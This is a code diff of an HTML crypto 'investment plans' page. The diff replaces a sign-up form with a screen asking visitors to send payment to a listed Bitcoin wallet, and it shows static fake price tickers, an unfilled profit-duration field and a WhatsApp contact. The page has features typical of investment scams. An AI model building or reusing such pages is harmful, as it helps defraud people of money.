@@ -5,14 +5,17 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Investment form</title>
+    <title>Investment plans</title>
     <link rel="shortcut icon" href="images/favicon.png">
+    <link rel="stylesheet" href="last.css">
     <link rel="stylesheet" href="./userside.css">
     <link rel="stylesheet" href="./fontss/fontawesome-free-5.15.3-web/attribution.js">
     <link rel="stylesheet" href="./fontss/Noto_Sans_JP/NotoSansJP-Black.otf">
     <link rel="stylesheet" href="./fontss/fontawesome-free-5.15.3-web/css/all.css">
-  </head>
-  <body>        
+</head>
+
+<body>
+<br class="brmob"> 
     <div class="crypto-layouts">
         <marquee behavior="" direction="" class="marqss">
             <div class="crypto-one"><i class="fab fa-bitcoin"></i>
@@ -22,6 +25,7 @@
                         +2.36%</a></p>
             </div>
         </marquee>
+
         <marquee behavior="" direction="">
             <div class="crypto-one"><i class="fab fa-ethereum"></i>
                 <b class="it">Etheleum</b>
@@ -29,14 +33,19 @@
                 <p class="btcprise"> <a href="https://www.blockchain.com/prices/ETH" class="plizrs" target="blanki">
                         +2.36%</a></p>
             </div>
+
         </marquee>
+
         <marquee behavior="" direction="">
-            <div class="crypto-one"><img src="https://img.icons8.com/pastel-glyph/64/000000/tron.png"/>
+            <div class="crypto-one"><img src="https://img.icons8.com/pastel-glyph/64/000000/tron.png" />
                 <b class="it">Tron</b>
                 <b class="it">$88.87</b>
-                <p class="btcprise"> <a href=" https://www.blockchain.com/prices/TRON" class="plizrser" target="blanki"> -2.36%</a></p>
+                <p class="btcprise"> <a href=" https://www.blockchain.com/prices/TRON" class="plizrser" target="blanki">
+                        -2.36%</a></p>
             </div>
+
         </marquee>
+
         <marquee behavior="" direction="">
             <div class="crypto-one"><i class="fas fa-dog"></i>
                 <b class="it">Doge</b>
@@ -44,7 +53,9 @@
                 <p class="btcprise"> <a href="https://www.blockchain.com/prices/DOGE" class="plizr" target="blanki">
                         -2.36%</a></p>
             </div>
+
         </marquee>
+
         <marquee behavior="" direction="">
             <div class="crypto-one"><i class="fab fa-uniregistry"></i>
                 <b class="it">Uni</b>
@@ -54,6 +65,7 @@
             </div>
 
         </marquee>
+
         <marquee behavior="" direction="">
             <div class="crypto-one"><i class="fab fa-instalod"></i>
                 <b class="it">ALGO</b>
@@ -62,74 +74,62 @@
                         -2.36%</a></p>
             </div>
         </marquee>
+    </div>  
+    <div class="containerd"> 
+        <br>  
+        <br> 
+        <div class="walety">
+            <b class="scan">
+                Click to Copy or scan the company wallet address bellow and make your transaction</b>
+        </div>  
+        <br>
+        <br> 
+        <div class="status-div">
+            <br> 
+            <div class="imgscan">
+                <img src="./images/wallet/InShot_20211210_200625554.jpg" alt="" class="walediv">
+            </div>
+            <br> 
+            <div class="vested">
+                <b class="teder">Amount Selled = 100$</b>
+            </div> 
+            <br> 
+            <div class="vested">
+                <b class="teder">Profit receiving duration = 
+                    <h1 id="t"></h1>  </b>
+            </div>  
+            <br>
+            <div class="vested">
+                <b class="teder">Investment status = Salled</b>
+            </div> 
+            <br> 
+            <div class="vested">
+                <b class="teder">Order status : waiting for your payment </b>
+            </div> 
+                <br> 
+            <div class="content">
+                <h2 title="click to copy address">
+                    <div class="fonsi">
+                        bc1q45zcwpyuem0e9uhzw4n4kaac9eur9ew9pgwdka <i class="far fa-copy"></i>
+                    </div>
+                </h2>
+                <div class="popup">
+                    <h4>
+                        Copied
+                    </h4>
+                </div>
+            </div>
+            <br> 
+        </div>  
     </div>
-     <div class="foem-container">
-        <br> 
-        <br> 
-        <br>   
-        <br>
-        <br>
-        <br>
-        <br>
-        <section class="set">
-           <form action="./last.html">
-              <div class="com"><b> 
-               Company <b style="color: white;"> form</b> 
-              </b>
-              <p class="flll">Fill out the form to get starded with your investment</p>
-              </div> 
-              <input type="text" placeholder="Name" required class="sqiz">
-              <br>
-              <br>
-              <input type="number" placeholder="Phone Number" required class="sqiz">
-              <br>
-              <br>
-              <input type="email" placeholder="Email" required class="sqiz">
-              <br>
-              <br>
-              <b class="cart">Cartegories</b>
-              <br>
-              <br>
-              <select name="" id="">
-                  <option value=""> USD</option>
-                  <option value=""> Crypto Currency</option>
-              </select>
-              <br>
-              <br>
-              <b class="cart">I whant to receive my profit in</b>
-              <br> 
-              <br>
-              <select name="" id="">
-                  <option value=""> USD</option>
-                  <option value="">ETH</option>
-                  <option value="">Bitcoin</option>
-              </select>
-              <br> 
-              <br> 
-              <input type="number" placeholder="Comfirm amount to invest" required  class="sqiz">
-              <br>
-              <br>
-              <input type="text" placeholder="Bitcoin wallet address for profit receiving" required class="sqiz">
-              <br>
-              <br>
-              <input type="text" placeholder="Eth wallet address for profit receiving" required class="sqiz">
-              <a href="./last.html">
-               <button class="dep-btns">
-                  Deposit   
-               </button></a>
-           </form> 
-        </section>  
-     </div> 
-     <br class="moji">
-     <br class="moji"> 
-     <br class="moji"> 
-     <br class="moji">
-     <div class="watbtns">
+    <div class="watbtns">
         <button class="appp">
             <a href="https://wa.me/09036837024" class="leto">
-             Am cunfused chart us on whatsapp
-         </a>
+                Am cunfused chart us on whatsapp
+            </a>
         </button>
-     </div> 
-  </body>
-  </html>
+    </div>
+    <script src="./copy.js"></script>
+</body>
+
+</html>
